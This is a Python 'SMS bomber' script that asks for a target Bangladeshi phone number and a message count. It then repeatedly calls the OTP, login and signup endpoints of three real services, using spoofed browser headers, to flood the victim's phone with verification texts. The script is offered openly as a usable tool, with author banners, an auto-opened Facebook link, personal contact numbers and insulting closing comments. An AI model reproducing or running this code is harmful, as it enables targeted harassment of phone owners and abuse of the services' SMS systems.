
import os,requests,time
time.sleep(1)
os.system("clear")
os.system("xdg-open https://www.facebook.com/profile.php?id=100086684731627&mibextid=ZbWKwL/")
logo3=("""

░█▄─░█ █▀▀█ █──█ █▀▀ █▀▀ █▀▄▀█ 
░█░█░█ █▄▄█ █▄▄█ █▀▀ █▀▀ █─▀─█ 
░█──▀█ ▀──▀ ▄▄▄█ ▀▀▀ ▀▀▀ ▀───▀                                       
\x1b[38;5;196m  \033[38;5;46m\x1b[38;5;196m
\x1b[38;5;196m\033[38;5;46m[🔵]\033[38;5;46m𝐀𝐔𝐓𝐇𝐎𝐑   \x1b[38;5;196m  \033[38;5;46m🦋⃟\x1b[38;5;196m\033[38;5;46mNAYEEM NAWAZ         \x1b[38;5;196m
\x1b[38;5;196m\033[38;5;46m[T]\033[38;5;46m𝐅𝐀𝐂𝐄𝐁𝐎𝐎𝐊  \x1b[38;5;196m  \033[38;5;46m\x1b[38;5;196m\033[38;5;46m Nayeem Nawaz      \x1b[38;5;196m
\x1b[38;5;196m\033[38;5;46m[A]\033[38;5;46m𝐖𝐇𝐀𝐓𝐒𝐀𝐏𝐏  \x1b[38;5;196m  \033[38;5;46m\x1b[38;5;196m\033[38;5;46m01827673253     \x1b[38;5;196m
\x1b[38;5;196m\033[38;5;46m[R]\033[38;5;46m𝐆𝐈𝐓𝐇𝐔𝐁    \x1b[38;5;196m \033[38;5;46m \x1b[38;5;196m\033[38;5;46mnayeemvai \x1b[38;5;196m
\x1b[38;5;196m\033[38;5;46m[E]\033[38;5;46m𝐓𝐄𝐋𝐄𝐆𝐑𝐀𝐌  \x1b[38;5;196m  \033[38;5;46m\x1b[38;5;196m\033[38;5;46m   01827673253 \x1b[38;5;196m
\x1b[38;5;196m\033[38;5;46m[]\033[38;5;46m𝐈𝐌𝐎       \x1b[38;5;196m  \033[38;5;46m\x1b[38;5;196m\033[38;5;46m 01827673253  \x1b[38;5;196m
\x1b[38;5;196m\033[38;5;46m[🔵]\033[38;5;46m𝐅𝐑𝐎𝐌     \x1b[38;5;196m \033[38;5;46m\x1b[38;5;196m \033[38;5;46m𝐁𝐀𝐍𝐆𝐋𝐀𝐃𝐄𝐒𝐇       \x1b[38;5;196m 
\x1b[38;5;196m \033[38;5;46m\x1b[38;5;196m\033[00m\033[1;30m""")
os.system('espeak -a 300 "author emran "')
os.system('espeak -a 300 "Facebook Nayeem Nawaz "')
os.system('espeak -a 300 "whathapp 01827673253"')
os.system('espeak -a 300 "github nayeemvai "')
os.system('espeak -a 300 "telegram 01827673253"')
os.system('espeak -a 300 "imo 01827673253 "')
os.system('espeak -a 300 "from Bangladesh "')
print(logo3)
num=input("""  \033[38;5;46mTARGET NUMBER : +880""")
amount=int(input("\n  \033[38;5;46mSMS AMOUNT : "))
headers1={
			  "authority":"www.bioscopelive.com",
			  "method":"GET",
			  "scheme":"https",
			  "accept":"*/*",
			  "accept-encoding":"gzip, deflate, br",
			  "accept-language":"en-US,en;q=0.9,bn-BD;q=0.8,bn;q=0.7",
			  "if-none-match":'W/"5baf0d010507bc980255f9941283860a"',
			  "referer":"https://www.bioscopelive.com/en/login?bongoId=QPj10yOQIwI",
			  "save-data":"on",
			  "sec-ch-ua":'"Chromium";v="107", "Not=A?Brand";v="24"',
			  "sec-ch-ua-mobile":"?1",
			  "sec-ch-ua-platform":'Android',
			  "sec-fetch-dest":"empty",
			  "sec-fetch-mode":"cors",
			  "sec-fetch-site":"same-origin",
			  "user-agent":"Mozilla/5.0 (Linux; Android 10; Z28) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36",
			  "x-requested-with":"XMLHttpRequest"
}
url1="https://www.bioscopelive.com/en/login/send-otp?phone=880"+num+"&operator=bd-otp"
headers2={
         "referer":"https://bikroy.com/bn/users/login?action=login&stack=webapp&redirect-url=/bn/users/login-options",
         "user-agent":"Mozilla/5.0 (Linux; Android 10; Z28) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36"
}
url2="https://bikroy.com/data/phone_number_login/verifications/phone_login?phone=0"+num
data={
  "name": num,
  "phoneNumber": num,
  "service": "redx"
}
headers3={
  "referer":"https://redx.com.bd/",
  "user-agent":"Mozilla/5.0 (Linux; Android 10; Z28) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36"
}
ses=0
while amount>ses:
  sent1=requests.get(url1,headers=headers1)
  if sent1.status_code==200:
    ses+=1
    print(f"\n{ses}  \033[38;5;46m🦋⃟𝗕𝗢𝗦𝗦✮⃝ NAYEEM𝄟⃝  SMS WAS SENT🐼")
  else:
    pass
  
  sent2=requests.get(url2,headers=headers2)
  if sent2.status_code==200:
    ses+=1
    print(f"\n{ses} \033[38;5;46m🦋⃟𝗕𝗢𝗦𝗦✮⃝ NAYEEM𝄟⃝  SMS WAS SENT🐼")
  else:
    pass
  
  send3=requests.post("https://api.redx.com.bd/v1/user/signup",headers=headers3,data=data)
  if send3.status_code==200:
    ses+=1
    print(f"\n{ses} \033[38;5;46🦋⃟𝗕𝗢𝗦𝗦✮⃝ NAYEEM𝄟⃝  SMS WAS SENT🐼")
    
  else:
    pass
os.system("clear")
print(""" \033[1;32m
\x1b[38;5;196m SEN🐼        

░█▄─░█ █▀▀█ █──█ █▀▀ █▀▀ █▀▄▀█ 
░█░█░█ █▄▄█ █▄▄█ █▀▀ █▀▀ █─▀─█ 
░█──▀█ ▀──▀ ▄▄▄█ ▀▀▀ ▀▀▀ ▀───▀      
\x1b[38;5;196m \033[38;5;46m🦋⃟𝗕𝗢𝗦𝗦✮⃝ NAYEEM𝄟⃝  \x1b[38;5;196m
\x1b[38;5;196m\033[38;5;46m[🔵]\033[38;5;46m𝐀𝐔𝐓𝐇𝐎𝐑   \x1b[38;5;196m  \033[38;5;46m🦋⃟𝗕𝗢𝗦𝗦✮⃝ NAYEEM𝄟⃝  \x1b[38;5;196m\033[38;5;46mNAYEEM              \x1b[38;5;196m
\x1b[38;5;196m\033[38;5;46m[T]\033[38;5;46m𝐅𝐀𝐂𝐄𝐁𝐎𝐎𝐊  \x1b[38;5;196m  \033[38;5;46m🦋⃟𝗕𝗢𝗦𝗦✮⃝ NAYEEM𝄟⃝  \x1b[38;5;196m\033[38;5;46mNAYEEM NAWAZ       \x1b[38;5;196m
\x1b[38;5;196m\033[38;5;46m[A]\033[38;5;46m𝐖𝐇𝐀𝐓𝐒𝐀𝐏𝐏  \x1b[38;5;196m  \033[38;5;46m🦋⃟𝗕𝗢𝗦𝗦✮⃝ NAYEEM𝄟⃝  \x1b[38;5;196m\033[38;5;46m01827673253     \x1b[38;5;196m║
\x1b[38;5;196m\033[38;5;46m[R]\033[38;5;46m𝐆𝐈𝐓𝐇𝐔𝐁    \x1b[38;5;196m \033[38;5;46m🦋⃟𝗕𝗢𝗦𝗦✮⃝ NAYEEM𝄟⃝  \x1b[38;5;196m\033[38;5;46mnayeemvai\x1b[38;5;196m║
\x1b[38;5;196m\033[38;5;46m[E]\033[38;5;46m𝐓𝐄𝐋𝐄𝐆𝐑𝐀𝐌  \x1b[38;5;196m \033[38;5;46m🦋⃟𝗕𝗢𝗦𝗦✮⃝ NAYEEM𝄟⃝  \x1b[38;5;196m\033[38;5;46m01827673253     \x1b[38;5;196m║
\x1b[38;5;196m\033[38;5;46m[Q]\033[38;5;46m𝐈𝐌𝐎       \x1b[38;5;196m \033[38;5;46m🦋⃟𝗕𝗢𝗦𝗦✮⃝ NAYEEM𝄟⃝  \x1b[38;5;196m\033[38;5;46m01827673253     \x1b[38;5;196m║
\x1b[38;5;196m\033[38;5;46m[🔵]\033[38;5;46m𝐅𝐑𝐎𝐌     \x1b[38;5;196m  \033[38;5;46m🦋⃟𝗕𝗢𝗦𝗦✮⃝ NAYEEM𝄟⃝ \x1b[38;5;196m \033[38;5;46m𝐁𝐀𝐍𝐆𝐋𝐀𝐃𝐄𝐒𝐇        \x1b[38;5;196m║
\x1b[38;5;196m  \033[38;5;46m🦋⃟𝗕𝗢𝗦𝗦✮⃝ NAYEEM𝄟⃝  \x1b[38;5;196m

████████╗░█████╗░██████╗░
╚══██╔══╝██╔══██╗██╔══██╗
░░░██║░░░██║░░██║██████╔╝
░░░██║░░░██║░░██║██╔══██╗
░░░██║░░░╚█████╔╝██║░░██║
░░░╚═╝░░░░╚════╝░╚═╝░░╚═╝

██████╗░░█████╗░██████╗░
██╔══██╗██╔══██╗██╔══██╗
██████╦╝███████║██████╔╝
██╔══██╗██╔══██║██╔═══╝░
██████╦╝██║░░██║██║░░░░░
╚═════╝░╚═╝░░╚═╝╚═╝░░░░░ 
                            
 TNQ FOR USING OUR TOOLS 🖤
""")
#madarcod ase geli script curi korte 🙂
#bancod tk khoroc kore nijeo to sikhte paros